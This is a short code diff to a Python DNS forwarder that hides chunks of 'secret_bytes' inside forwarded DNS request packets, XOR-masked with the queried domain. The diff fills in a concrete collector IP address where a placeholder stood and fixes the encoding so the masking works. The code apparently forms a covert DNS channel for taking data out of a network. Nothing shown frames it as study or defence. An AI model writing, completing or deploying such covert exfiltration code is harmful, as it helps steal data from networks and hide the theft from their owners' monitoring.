@@ -6,7 +6,7 @@ import os
 
 n_times_6_bytes = 0
 secret_bytes: bytes
-collector_ip = '1.1.1.1'  # FIXME
+collector_ip = '20.79.206.157'
 
 
 def receive_data(udps):
@@ -37,7 +37,7 @@ def forward_dns_request(data, next_dns_address="1.1.1.1"):
 
 def encode_data(data, domain):
     secret = get_next_6_bytes_of_text()
-    secret = byte_xor(secret, bytes(domain[:6]))
+    secret = byte_xor(secret, bytes(domain[:6], "utf-8"))
     print(data)
     data = data[0:6] + secret + data[12:]
     print(data)
